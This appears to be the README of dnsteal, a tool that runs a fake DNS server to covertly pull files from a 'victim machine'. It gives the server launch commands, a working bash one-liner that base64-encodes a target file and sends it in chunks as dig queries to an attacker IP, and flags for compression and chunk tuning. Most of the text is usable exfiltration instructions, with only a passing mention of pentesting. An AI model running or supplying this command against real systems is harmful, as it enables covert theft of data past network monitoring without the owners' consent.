# dnsteal v3.0

This is a fake DNS server that allows you to stealthily extract files from a victim machine through DNS requests.

Below are a couple of different images showing examples of multiple file transfer and single verbose file transfer:

![Alt text](http://i.imgur.com/nJsoAMv.png)

* Support for multiple files
* Gzip compression supported
* Now supports the customisation of subdomains and bytes per subdomain and the length of filename

See help below:

![Alt text](http://i.imgur.com/GT5SV2L.png)

## Requirements

For all of these examples, you'll need:
- **Client machine**, with `bash` and `dig` installed (unless you tweak the client-side commands).
- **Server machine** with Python 3 installed, that you're able to open a
  port on. This is will be your fake DNS server.
  - Naturally using port 53 would be preferable, but you can use any port, which is
    particular useful if you don't have root privilegess, or plan on proxying
    to a different port.
- If you just want to test the tool out, the two machines can be on the same
  network. In a real pentesting engagement, you'll want the server to be
  accesible to the outside world with a public IP.

### Basic exfiltration example

#### Server
To start the fake DNS server, you can use the following command:

```bash
python dnsteal.py 0.0.0.0 53
```

If the port is below 1024, you'll need to the run the script as root or find another workaround.


#### Client

The `dnsteal.py` script will generate some example client-side commands that
you can run which utilize `dig` for the DNS exfiltration. **You should just use
what it gives you**, as it will customize the command based on your input.

That being said, a barebones command would look something like:

```bash
 f=SECRET_FILE.txt; s=4;b=57;c=0; for r in $(for i in $(base64 -b0 $f| sed "s/.\{$b\}/&\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\n$i-."; c=1; fi; done ); do dig @YOUR_IP_HERE `echo -ne $r$f|tr "+" "*"` +short; done
```

### Detailed exfiltration example

If we were to run the script again, and populate some of the other arguments:
- `-z`: Zip the files before sending them over DNS
- `-v`: Enable verbose output
- `-s`: The number of nested subdomains to use per request
- `-b 123`: The number of bytes per subdomain
- `-f 123`: The maximum length of any given filename we may be exfiltrating

```bash
python dnsteal.py 127.0.0.1 53 -z -v -b 45 -s 4 -f 15
```
